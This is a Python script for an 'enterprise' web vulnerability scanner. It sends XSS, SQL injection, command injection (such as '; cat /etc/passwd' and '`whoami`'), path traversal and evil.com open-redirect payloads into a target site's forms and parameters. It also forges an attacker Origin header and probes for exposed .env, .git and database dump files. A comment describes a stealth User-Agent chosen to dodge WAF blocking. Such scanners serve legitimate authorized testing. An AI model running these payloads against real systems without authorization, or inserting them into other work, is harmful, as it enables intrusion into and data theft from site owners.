import requests
from bs4 import BeautifulSoup
import urllib.parse as urlparse
import datetime
import os
from colorama import Fore, Style, init

# Initialize Colorama for high-end enterprise terminal logging
init(autoreset=True)

class EnterpriseVAPTScanner:
    def __init__(self, target_url):
        self.target_url = target_url if target_url.endswith('/') else target_url + '/'
        self.session = requests.Session()
        # High-end Stealth User-Agent to avoid immediate WAF blocking during audit
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Enterprise-Security-Auditor/3.0"})
        self.vulns_found = []
        
        # Comprehensive Global Exploit Payload Database
        self.xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\";alert(1)//"]
        self.sqli_payloads = ["'", "1' OR '1'='1", "' UNION SELECT NULL,NULL --", '" OR 1=1 --']
        self.rce_payloads = ["; cat /etc/passwd", "| id", "; dir", "`whoami`"]
        self.lfi_payloads = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "index.php?page=../../../../etc/passwd"]
        self.open_redirect_payloads = ["https://evil.com", "//evil.com", "@evil.com"]
        self.sensitive_dirs = ["admin/", "config.php", ".git/", ".env", "backup.zip", "wp-admin/", "db.sql", "robots.txt"]

    def log(self, level, message):
        if level == "info":
            print(f"{Fore.BLUE}[*] {message}")
        elif level == "success":
            print(f"{Fore.GREEN}[✅] {message}")
        elif level == "warn":
            print(f"{Fore.YELLOW}[!] {message}")
        elif level == "danger":
            print(f"{Fore.RED}[🔥] CRITICAL VULNERABILITY: {message}")

    def run_comprehensive_audit(self):
        self.log("info", f"Initiating Enterprise VAPT Pipeline against Scope: {self.target_url}")
        
        # Execute Independent Modular Audits
        self.audit_http_headers_and_cors()
        self.run_directory_bruteforcer()
        self.test_open_redirect()
        
        # Extract Forms for Parameterized Injections
        forms = self.extract_infrastructure_forms()
        self.execute_injection_attacks(forms)
        
        # Compile Enterprise Grade HTML Asset Log
        self.generate_executive_report()

    def audit_http_headers_and_cors(self):
        """Module 1, 2 & 3: Validates HTTP Headers, Cookie Security Flag, and CORS Configuration."""
        self.log("info", "Auditing HTTP Security Architecture & CORS Policies...")
        try:
            # Test CORS Misconfiguration by sending a custom Origin
            custom_headers = {"Origin": "https://attacker-domain.com"}
            res = self.session.get(self.target_url, headers=custom_headers, timeout=5)
            headers = res.headers

            # 1. CORS Validation
            if headers.get("Access-Control-Allow-Origin") == "*" or headers.get("Access-Control-Allow-Origin") == "https://attacker-domain.com":
                self.vulns_found.append({
                    "type": "CORS Misconfiguration", "severity": "High",
                    "details": f"Access-Control-Allow-Origin is insecurely configured to mirror origin or use wildcards.",
                    "remediation": "Restrict 'Access-Control-Allow-Origin' headers to trusted, explicit white-listed domains."
                })
                self.log("warn", "Insecure CORS Policy Detected (Risk: Cross-Domain Data Theft)")

            # 2. Base Security Headers Audit
            security_headers = {
                "Content-Security-Policy": ("Missing CSP (Risk: Script Injection / XSS)", "Medium"),
                "X-Frame-Options": ("Missing Frame Protection (Risk: Clickjacking)", "Low"),
                "X-Content-Type-Options": ("Missing MIME Sniffing Protection", "Low"),
                "Strict-Transport-Security": ("Missing HSTS (Risk: MITM / Cleartext Transport)", "Medium")
            }
            for header, (desc, severity) in security_headers.items():
                if header not in headers:
                    self.vulns_found.append({"type": "Missing Security Header", "severity": severity, "details": f"Server header '{header}' is absent.", "remediation": f"Configure web server architecture to enforce the '{header}' security directive."})
                    self.log("warn", f"Missing Defense Directive: {header} [{severity}]")

            # 3. Session Cookie Hardening Check
            for cookie in self.session.cookies:
                if not cookie.secure or not cookie.has_nonstandard_attr('HttpOnly'):
                    self.vulns_found.append({"type": "Insecure Session Cookie", "severity": "Medium", "details": f"Cookie '{cookie.name}' lacks Secure/HttpOnly flags.", "remediation": "Instantly enforce 'Secure' and 'HttpOnly' flags on all modern session cookies."})
                    self.log("warn", f"Insecure Session Token Configuration: {cookie.name}")
        except Exception as e:
            self.log("warn", f"HTTP Header / CORS audit bypassed due to: {str(e)}")

    def run_directory_bruteforcer(self):
        """Module 4: Probes server for exposed configuration files and credentials."""
        self.log("info", "Probing infrastructure for Exposed Administrative Directories...")
        for path in self.sensitive_dirs:
            test_url = urlparse.urljoin(self.target_url, path)
            try:
                res = self.session.get(test_url, timeout=3, allow_redirects=False)
                if res.status_code == 200 and len(res.content) > 0:
                    self.vulns_found.append({
                        "type": "Information Disclosure / Exposed Directory", "severity": "High",
                        "details": f"Sensitive asset uncovered directly at: {test_url}",
                        "remediation": "Enforce strict IP restrictions or remove public exposure of administrative endpoints."
                    })
                    self.log("danger", f"Exposed Administrative Resource Uncovered: {test_url}")
            except:
                continue

    def test_open_redirect(self):
        """Module 5: Tests for Open Redirect Vulnerabilities on common routing parameters."""
        self.log("info", "Testing Target Architecture for Open Redirect Vulnerabilities...")
        common_redirect_params = ["url", "redirect", "next", "goto", "return_to"]
        for param in common_redirect_params:
            for payload in self.open_redirect_payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                try:
                    res = self.session.get(test_url, timeout=4, allow_redirects=False)
                    if res.status_code in [301, 302] and payload in res.headers.get("Location", ""):
                        self.vulns_found.append({
                            "type": "Open Redirect", "severity": "Medium",
                            "details": f"Parameter '{param}' accepts untrusted inputs to execute unauthorized structural offsite redirection.",
                            "remediation": "Implement rigid routing validation or enforce local relative destination paths."
                        })
                        self.log("danger", f"Open Redirect Verified at endpoint: {test_url}")
                        return
                except:
                    continue

    def extract_infrastructure_forms(self):
        try:
            res = self.session.get(self.target_url, timeout=5)
            soup = BeautifulSoup(res.content, "html.parser")
            return soup.find_all("form")
        except:
            return []

    def execute_injection_attacks(self, forms):
        """Module 6, 7, 8, 9 & 10: Runs Heavy Exploit Simulation (XSS, SQLi, RCE, LFI, and CSRF) against HTML inputs."""
        if not forms:
            self.log("warn", "Zero active HTML form nodes uncovered. Skipping automated input injection matrix.")
            return

        self.log("info", f"Deploying Advanced Exploit Simulation Matrix against {len(forms)} HTML entry fields...")
        
        for form in forms:
            action = form.get("action", "")
            post_url = urlparse.urljoin(self.target_url, action)
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")

            # 6. Verify Anti-CSRF Mitigations
            has_csrf_token = any(any(token in (ipt.get("name", "").lower() + ipt.get("id", "").lower()) for token in ["csrf", "token", "xsrf", "authenticity"]) for ipt in inputs)
            if method == "post" and not has_csrf_token:
                self.vulns_found.append({
                    "type": "Missing Anti-CSRF Token", "severity": "High",
                    "details": f"State-changing POST form at {post_url} lacks cryptographic transaction tokens.",
                    "remediation": "Integrate unique per-session Anti-CSRF verification tokens across all state-changing endpoints."
                })
                self.log("danger", f"Missing Anti-CSRF Tokens on active entry vector: {post_url}")

            # Heavy Attack Matrix Setup
            attack_matrix = [
                ("SQL Injection (SQLi)", self.sqli_payloads, "Critical", "Utilize parameterized statements and ORM frameworks."),
                ("Cross-Site Scripting (XSS)", self.xss_payloads, "High", "Sanitize contextual inputs and enforce strict output encoding."),
                ("Remote Code Execution (RCE)", self.rce_payloads, "Critical", "Disable dangerous backend function execution systems."),
                ("Local File Inclusion (LFI)", self.lfi_payloads, "High", "Apply white-list filename validation filters on server targets.")
            ]

            for attack_name, payloads, severity, remedial in attack_matrix:
                for payload in payloads:
                    data = {}
                    for ipt in inputs:
                        name = ipt.get("name")
                        ipt_type = ipt.get("type", "text")
                        if ipt_type in ["text", "search", "url", "password", "hidden"] and name:
                            data[name] = payload

                    if not data: continue

                    try:
                        res = self.session.post(post_url, data=data, timeout=5) if method == "post" else self.session.get(post_url, params=data, timeout=5)
                        
                        # Definitive Proof-of-Concept (PoC) Verification Architecture
                        is_exploited = False
                        if attack_name == "Cross-Site Scripting (XSS)" and payload in res.text:
                            is_exploited = True
                        elif attack_name == "SQL Injection (SQLi)" and any(err in res.text.lower() for err in ["sql syntax", "mysql_fetch", "ora-00933", "sqlite3.error", "postgre"]):
                            is_exploited = True
                        elif attack_name == "Remote Code Execution (RCE)" and any(ind in res.text for ind in ["root:x:", "uid=", "Directory of"]):
                            is_exploited = True
                        elif attack_name == "Local File Inclusion (LFI)" and any(ind in res.text for ind in ["root:x:0:0", "[boot loader]", "cmroute.dll"]):
                            is_exploited = True

                        if is_exploited:
                            self.vulns_found.append({
                                "type": attack_name, "severity": severity,
                                "details": f"{attack_name} payload confirmed active at target vector: {post_url}",
                                "remediation": remedial
                            })
                            self.log("danger", f"{attack_name} Exploitation Confirmed at {post_url}")
                            break
                    except:
                        continue

    def generate_executive_report(self):
        report_file = "enterprise_vapt_dashboard.html"
        self.log("info", f"Writing executive audit findings to automated dashboard asset...")
        
        vuln_rows = ""
        if not self.vulns_found:
            vuln_rows = "<tr><td colspan='4' style='text-align:center; color:#10b981; padding:30px; font-weight:bold;'>Asset satisfies current enterprise infrastructure security baselines. No risks recorded.</td></tr>"
        else:
            for v in self.vulns_found:
                color = "#7f1d1d" if v['severity'] == "Critical" else "#b91c1c" if v['severity'] == "High" else "#c2410c" if v['severity'] == "Medium" else "#1d4ed8"
                bg_color = "#fef2f2" if v['severity'] in ["Critical", "High"] else "#fff7ed" if v['severity'] == "Medium" else "#eff6ff"
                vuln_rows += f"""
                <tr style='background-color: {bg_color};'>
                    <td><b>{v['type']}</b></td>
                    <td style='color:{color}; font-weight:bold; text-transform:uppercase;'>{v['severity']}</td>
                    <td><code>{v['details']}</code></td>
                    <td>{v['remediation']}</td>
                </tr>
                """

        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enterprise Risk Assessment Dashboard</title>
            <style>
                body {{ font-family: 'Inter', -apple-system, BlinkMacSystemFont, Arial, sans-serif; margin: 50px; background-color: #f8fafc; color: #1e293b; }}
                h1 {{ color: #0f172a; border-bottom: 4px solid #0284c7; padding-bottom: 15px; font-size: 32px; letter-spacing: -0.5px; }}
                .summary-card {{ background: white; padding: 25px; border-radius: 12px; margin-bottom: 30px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.05); border-top: 6px solid #0f172a; }}
                table {{ width: 100%; border-collapse: collapse; margin-top: 25px; background: white; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); border-radius: 12px; overflow: hidden; }}
                th, td {{ border: 1px solid #e2e8f0; text-align: left; padding: 16px; font-size: 14.5px; }}
                th {{ background-color: #0f172a; color: white; font-weight: 600; text-transform: uppercase; font-size: 12px; letter-spacing: 0.5px; }}
                code {{ background-color: #f1f5f9; padding: 3px 8px; border-radius: 6px; color: #b91c1c; font-family: 'Consolas', monospace; font-size: 13.5px; word-break: break-all; }}
            </style>
        </head>
        <body>
            <h1>Vulnerability Assessment & Penetration Testing (VAPT) Corporate Log</h1>
            <div class="summary-card">
                <p><b>Target Scope/Domain:</b> {self.target_url}</p>
                <p><b>Audit Timestamp:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p><b>Compliance Baseline:</b> OWASP Top 10 Enterprise Framework Integration</p>
                <p><b>Total Threat Nodes Identified:</b> <span style="color:#b91c1c; font-weight:bold;">{len(self.vulns_found)}</span></p>
            </div>
            <h2>Identified Security Risk Register</h2>
            <table>
                <tr>
                    <th style="width: 20%;">Vulnerability Axis</th>
                    <th style="width: 10%;">Severity Target</th>
                    <th style="width: 45%;">Technical Proof-of-Concept (PoC)</th>
                    <th style="width: 25%;">Remediation Engineering</th>
                </tr>
                {vuln_rows}
            </table>
        </body>
        </html>
        """
        with open(report_file, "w", encoding="utf-8") as f:
            f.write(html_content)
        
        self.log("success", f"VAPT Pipeline Finished. Executive asset exported to browser environment.")
        os.system(f"start {report_file}" if os.name == "nt" else f"xdg-open {report_file}")

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.BLUE + Style.BRIGHT + "=" * 80)
    print(Fore.BLUE + Style.BRIGHT + "       ENTERPRISE GRADE WEB APPLICATION SECURITY ASSESSMENT & VAPT TOOL      ")
    print(Fore.BLUE + Style.BRIGHT + "=" * 80)
    
    target = input("Enter Authorized Target Infrastructure URL (e.g., http://target.local): ").strip()
    if target:
        scanner = EnterpriseVAPTScanner(target)
        scanner.run_comprehensive_audit()
